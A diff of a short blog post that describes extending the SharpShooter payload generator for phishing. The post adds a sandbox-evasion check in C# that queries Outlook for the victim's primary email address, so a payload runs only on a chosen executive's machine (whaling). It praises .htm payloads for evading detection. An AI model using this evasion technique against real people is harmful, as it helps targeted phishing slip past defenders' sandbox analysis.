@@ -3,12 +3,12 @@ layout: post
 title: Sharply shoot phishing target
 ---
 
-Thanks Sharpshooter for providing such a excellent tool to generate payload. File with .htm extension is so much easier to go under the radar.  <br>
+Thanks Sharpshooter for providing such a excellent tool to generate payload. File with .htm extension is so much easier to go under the radar. <br>
 
 Although it comes with sandbox evasion, I may not able to use that 4 built-in techniques to distinguish a well-built sandbox from a normal laptop. Then I realized enterprise email account would be a good identifier, if you are doing whaling. Just add a new Case and ask outlook for primary address, not credential prompt on client-side~~~
 
 In SharpShooter/CSharpShooterStageless/SharpShooter.cs
-```C#
+```
 public void CheckPlease(int check, string arg)
   {
       CheckPlease cp = new CheckPlease();
@@ -38,7 +38,7 @@ public void CheckPlease(int check, string arg)
 
 In SharpShooter/CSharpShooterStageless/CheckPlease.cs
 
-```C#
+```
 public bool isDesignatedEmail(String input)
 {
     if ((new Outlook.Application()).Session.Accounts[1].SmtpAddress.Equals(input))
